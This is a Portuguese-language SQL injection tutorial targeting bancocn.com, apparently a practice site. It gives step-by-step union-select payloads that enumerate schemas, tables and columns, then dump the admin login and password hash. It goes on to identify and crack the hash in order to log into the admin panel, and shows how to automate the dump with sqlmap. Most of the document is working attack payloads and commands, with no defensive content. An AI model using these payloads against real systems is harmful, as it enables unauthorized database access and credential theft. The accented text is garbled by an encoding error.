# SQL Injection - Atacando o Servidor üíâ

### Lista o nome dos bancos de dados:

* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata

Retorna `bancocn,information_schema` que s√£o os dois bancos que o usu√°rio tem permiss√µes.

### Lista o nome de tabelas dentro de um banco de dados:

* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="bancocn"

Retorna `categories,pictures,status,users`.

### Lista colunas das tabelas:

* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"

Retorna `id,login,password`.

### Lista os dados das colunas:

* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(login) from users

Retorna `admin`.


* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(password) from users

Retorna o hash da senha do usu√°rio `admin`.


### B√¥nus

Podemos tamb√©m executar o seguinte comando:

* bancocn.com/cat.php?id=-1 union select 1,2,group_concat(id, ": ",login,": ",password) from users

Para termos o retorno: `1: admin: <hash da senha do usu√°rio admin>`.


## Hash Identifier

```bash
hash-identifier

HASH: <hash>
```

    Possible Hashs:
    [+] MD5
    [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))


Descriptografado o hash, podemos acessar o seu conte√∫do e utilizar as credenciais para acessar o painel administrativo do bancocn.com

## Automatizando o SQL Injection

Podemos tamb√©m utilizar a ferramenta `sqlmap` para automatizar o processo de SQL Injection.

```bash
sqlmap -u "http://www.bancocn.com/cat.php?id=1"
```


```bash
sqlmap -r <cookies.txt>
```

* u: URL do site;
* r: Ler arquivo contendo os cookies do navegador;

##### Ap√≥s terminada a inje√ß√£o SQL pela ferramenta podemos executar os seguintes comandos:

* --dbs: Lista os bancos de dados do arquivo passado;
* -D <database> --tables: Lista as tabelas do banco de dados;
* -T <tablename> --columns: Lista as colunas da tabela do banco de dados;
* -C <column1,column2,column3> --dump: Realiza o `dump` das informa√ß√µes desejadas;